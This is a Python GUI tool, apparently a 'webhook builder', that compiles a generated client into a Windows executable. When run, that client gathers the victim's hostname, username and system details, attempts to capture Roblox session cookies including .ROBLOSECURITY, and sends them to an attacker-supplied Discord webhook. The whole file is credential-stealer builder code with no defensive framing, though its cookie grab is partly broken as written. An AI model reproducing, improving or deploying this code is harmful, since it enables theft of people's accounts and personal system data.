import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import os
import subprocess
import sys
import tempfile
import platform
import socket

class WebhookTool:
    def __init__(self, root):
        self.root = root
        self.root.title("🔍 Data Tool")
        self.root.geometry("700x500")
        self.root.resizable(False, False)
        self.root.configure(bg='#0a0a0a')
        
        self.configure_styles()
        self.create_widgets()
    
    def configure_styles(self):
        style = ttk.Style()
        
        # Configure dark theme
        style.theme_use('clam')
        
        # Configure colors
        style.configure('TFrame', background='#0a0a0a')
        style.configure('TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 10))
        style.configure('Title.TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 18, 'bold'))
        style.configure('Header.TLabel', background='#0a0a0a', foreground='#ffffff', font=('Arial', 11, 'bold'))
        
        # Configure custom button style
        style.configure('Cool.TButton', 
                       background='#00ff00',
                       foreground='#000000',
                       focuscolor='none',
                       borderwidth=2,
                       relief='raised',
                       font=('Arial', 10, 'bold'))
        
        style.map('Cool.TButton',
                 background=[('active', '#00cc00'),
                           ('pressed', '#009900')],
                 relief=[('pressed', 'sunken')])
    
    def create_widgets(self):
        # Main frame with cool border
        main_frame = ttk.Frame(self.root, padding=20, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title with cool styling
        title_frame = ttk.Frame(main_frame, style='TFrame')
        title_frame.pack(fill=tk.X, pady=(0, 20))
        
        title_label = ttk.Label(title_frame, text="🚀 WEBHOOK BUILDER", style='Title.TLabel')
        title_label.pack()
        
        subtitle_label = ttk.Label(title_frame, text="Create custom data collection tools", style='Header.TLabel')
        subtitle_label.pack(pady=(5, 0))
        
        # Webhook input section with cool border
        webhook_frame = ttk.LabelFrame(main_frame, text="📡 WEBHOOK SETUP", padding=20)
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(webhook_frame, text="Discord Webhook URL:", style='Header.TLabel').pack(anchor=tk.W)
        
        # Custom entry field - FIXED THIS LINE
        self.webhook_entry = tk.Entry(webhook_frame, width=70, font=('Arial', 10),
                                     bg='#1a1a1a', fg='#00ff00', insertbackground='#00ff00',
                                     relief='solid', bd=2)
        self.webhook_entry.pack(fill=tk.X, pady=10, ipady=5)
        
        # Test button with cool styling
        test_btn = ttk.Button(webhook_frame, text="🔍 TEST WEBHOOK", 
                            command=self.test_webhook, style='Cool.TButton',
                            width=20)
        test_btn.pack(pady=10)
        
        # Build section
        build_frame = ttk.LabelFrame(main_frame, text="🛠️ BUILD TOOL", padding=20)
        build_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(build_frame, text="Create executable tool:", style='Header.TLabel').pack(anchor=tk.W)
        
        # Build button with cool styling
        build_btn = ttk.Button(build_frame, text="⚡ BUILD EXE", 
                             command=self.build_exe, style='Cool.TButton',
                             width=20)
        build_btn.pack(pady=15)
        
        # Status section
        status_frame = ttk.Frame(main_frame, style='TFrame')
        status_frame.pack(fill=tk.X, pady=20)
        
        self.status_label = ttk.Label(status_frame, text="🟢 Ready to build", 
                                     font=('Arial', 9, 'bold'),
                                     foreground='#00ff00')
        self.status_label.pack()
        
        self.progress = ttk.Progressbar(status_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=(5, 0))
        
        # Footer
        footer_label = ttk.Label(main_frame, text="© 2024 Tool Builder | v1.0", 
                               font=('Arial', 8),
                               foreground='#444444')
        footer_label.pack(side=tk.BOTTOM, pady=10)
    
    def test_webhook(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL")
            return
        
        self.status_label.config(text="🟡 Testing webhook...")
        self.progress.start()
        
        try:
            data = {
                "content": "**🔍 Webhook Test** - Connection successful! ✅"
            }
            
            response = requests.post(webhook_url, json=data, timeout=10)
            
            if response.status_code == 204:
                self.status_label.config(text="🟢 Webhook test successful!")
                messagebox.showinfo("Success", "✅ Webhook test successful! Check your Discord.")
            else:
                self.status_label.config(text="🔴 Webhook test failed")
                messagebox.showerror("Error", f"❌ Webhook test failed. Status: {response.status_code}")
                
        except Exception as e:
            self.status_label.config(text="🔴 Error testing webhook")
            messagebox.showerror("Error", f"❌ Failed to test webhook: {str(e)}")
        finally:
            self.progress.stop()
    
    def build_exe(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL first")
            return
        
        self.status_label.config(text="🟡 Building executable...")
        self.progress.start()
        
        try:
            client_script = self.create_client_script(webhook_url)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
                f.write(client_script)
                temp_script_path = f.name
            
            output_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("Executable files", "*.exe")],
                title="Save Tool EXE",
                initialfile="DataTool.exe"
            )
            
            if not output_path:
                os.unlink(temp_script_path)
                self.status_label.config(text="🟡 Build cancelled")
                self.progress.stop()
                return
            
            self.status_label.config(text="🟡 Compiling... This may take a minute.")
            self.root.update()
            
            # Build with PyInstaller
            subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                temp_script_path
            ], check=True, timeout=120)
            
            os.unlink(temp_script_path)
            self.status_label.config(text="🟢 EXE built successfully!")
            messagebox.showinfo("Success", "✅ Executable built successfully! Check the 'dist' folder.")
            
        except Exception as e:
            self.status_label.config(text="🔴 Build failed")
            messagebox.showerror("Error", f"❌ Build failed: {str(e)}")
        finally:
            self.progress.stop()
    
    def create_client_script(self, webhook_url):
        return f'''import requests
import tkinter as tk
from tkinter import messagebox
import platform
import socket
import os

class CoolApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🔍 Data Tool")
        self.root.geometry("500x350")
        self.root.configure(bg='#0a0a0a')
        self.root.resizable(False, False)
        
        # Make window always on top
        self.root.attributes('-topmost', True)
        
        self.create_widgets()
    
    def create_widgets(self):
        # Main frame
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title_label = tk.Label(main_frame, text="🔍 DATA TOOL", 
                              font=('Arial', 20, 'bold'),
                              fg='#00ff00', bg='#0a0a0a')
        title_label.pack(pady=20)
        
        # Description
        desc_label = tk.Label(main_frame, 
                             text="Click to collect and send system data",
                             font=('Arial', 11),
                             fg='#ffffff', bg='#0a0a0a')
        desc_label.pack(pady=10)
        
        # Cool button
        self.collect_btn = tk.Button(main_frame, text="🚀 COLLECT DATA",
                                   command=self.collect_data,
                                   font=('Arial', 14, 'bold'),
                                   bg='#00ff00',
                                   fg='#000000',
                                   activebackground='#00cc00',
                                   activeforeground='#000000',
                                   relief='raised',
                                   bd=4,
                                   width=20,
                                   height=2)
        self.collect_btn.pack(pady=30)
        
        # Status
        self.status_label = tk.Label(main_frame, text="Ready to collect",
                                   font=('Arial', 9),
                                   fg='#00ff00', bg='#0a0a0a')
        self.status_label.pack(pady=10)
        
        # Footer
        footer_label = tk.Label(main_frame, text="Secure Data Tool v1.0",
                              font=('Arial', 8),
                              fg='#444444', bg='#0a0a0a')
        footer_label.pack(side=tk.BOTTOM)
    
    def get_system_info(self):
        """Get real system information"""
        try:
            hostname = socket.gethostname()
            system = platform.system()
            version = platform.version()
            username = os.getlogin()
            processor = platform.processor()
            
            return f"""
**💻 SYSTEM INFORMATION**
- **Computer Name:** `{{hostname}}`
- **Username:** `{{username}}`
- **OS:** `{{system}} {{version}}`
- **Processor:** `{{processor}}`
- **Architecture:** `{{platform.architecture()[0]}}`
"""
        except Exception as e:
            return f"**System Info Error:** `{{str(e)}}`"
    
    def get_roblox_data(self):
        """Get Roblox cookie data"""
        try:
            session = requests.Session()
            url = 'https://www.roblox.com/home'
            headers = {{
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }}
            
            response = session.get(url, headers=headers, timeout=10)
            cookies = session.cookies.get_dict()
            
            roblosecurity = cookies.get('.ROBLOSECURITY', 'NOT_LOGGED_IN')
            
            # Format cookie info
            cookie_info = ""
            for name, value in cookies.items():
                cookie_info += f"- **{{name}}:** `{{value}}`\\\\n"
            
            return {{
                "roblosecurity": roblosecurity,
                "cookies_found": len(cookies),
                "cookie_details": cookie_info,
                "status": "SUCCESS"
            }}
            
        except Exception as e:
            return {{
                "roblosecurity": "ERROR",
                "cookies_found": 0,
                "cookie_details": f"Error: {{str(e)}}",
                "status": "FAILED"
            }}
    
    def collect_data(self):
        """Collect and send all data"""
        self.status_label.config(text="🟡 Collecting data...")
        self.collect_btn.config(state='disabled')
        self.root.update()
        
        try:
            # Get system info
            system_info = self.get_system_info()
            
            # Get Roblox data
            roblox_data = self.get_roblox_data()
            
            # Create Discord message
            embed = {{
                "title": "🔍 NEW DATA CAPTURE",
                "color": 0x00ff00,
                "fields": [
                    {{
                        "name": "💻 System Info",
                        "value": system_info,
                        "inline": False
                    }},
                    {{
                        "name": "🎮 Roblox Data",
                        "value": f"**Status:** `{{roblox_data['status']}}`\\\\n**Cookies Found:** `{{roblox_data['cookies_found']}}`\\\\n**ROBLOSECURITY:** `{{roblox_data['roblosecurity']}}`",
                        "inline": False
                    }},
                    {{
                        "name": "🍪 Cookie Details",
                        "value": roblox_data['cookie_details'] if roblox_data['cookie_details'] else "No cookies captured",
                        "inline": False
                    }}
                ]
            }}
            
            data = {{
                "content": "🚨 **NEW DATA CAPTURED**",
                "embeds": [embed]
            }}
            
            # Send to webhook
            response = requests.post("{webhook_url}", json=data, timeout=15)
            
            if response.status_code == 204:
                self.status_label.config(text="🟢 Data sent successfully!")
                messagebox.showinfo("Success", 
                                  f"✅ **DATA SENT SUCCESSFULLY!**\\\\n\\\\n"
                                  f"**System Info:** Captured\\\\n"
                                  f"**Roblox Cookies:** {{roblox_data['cookies_found']}} found\\\\n"
                                  f"**Status:** {{roblox_data['status']}}")
            else:
                self.status_label.config(text="🔴 Failed to send")
                messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
                
        except Exception as e:
            self.status_label.config(text="🔴 Error occurred")
            messagebox.showerror("Error", f"❌ Collection failed: {{str(e)}}")
        finally:
            self.collect_btn.config(state='normal')

def main():
    root = tk.Tk()
    app = CoolApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
'''

if __name__ == "__main__":
    root = tk.Tk()
    app = WebhookTool(root)
    root.mainloop()
